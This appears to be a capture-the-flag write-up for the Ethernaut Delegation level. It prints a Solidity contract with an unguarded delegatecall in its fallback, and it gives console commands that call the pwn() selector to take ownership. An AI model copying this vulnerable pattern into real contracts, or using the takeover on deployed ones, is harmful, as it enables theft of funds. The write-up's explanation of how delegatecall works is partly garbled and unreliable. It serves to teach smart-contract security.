<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel6.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

Challenge's message.

> The goal of this level is for you to claim ownership of the instance you are given.

If we scrutinise contracts, there is only variable named owner in the **Delagate** contract and in the **Delagation** contract has owner and delegate variable. What is more , there is  a ```fallback()``` function which is exploitable. As long as we call fallback function with Delegate's function name, we can change some value. :) Let's do it!

# Subverting

In the fallback function there is calling some data from Delegate contract with ```delegatecall``` method. Shortly, **delegate** is a low level function similar to **call**. When contract **Delegation** executes delegatecall to contract **Delegate**, **Delegate**'s code is executed with contract **Delegation**s storage, **_msg.data_**.

For this part form of hacking, we must call fallback() from Delegation contract to trigger vulnerability and it will call pwn() function from Delegate contract. In other saying, after created variable named pwn and encode it with **keccak256**, I am calling pwn() function with **msg.data** when I use ```sendTransaction``` method. The truth of the matter is that the delegatecall function returns a **storage value** from the called address, so when we call the pwn function, the contract will update us as the **new owner**.

```shell
await contract.owner()
'0x73379d8B82Fda494ee59555f333DF7D44483fD58'
```

```shell
var pwn = web3.utils.keccak256("pwn()")
```
```shell
await contract.sendTransaction({data: pwn})
```

```shell
await contract.owner()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

Ethernaut's message.

>Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.

**_by wasny0ps_**
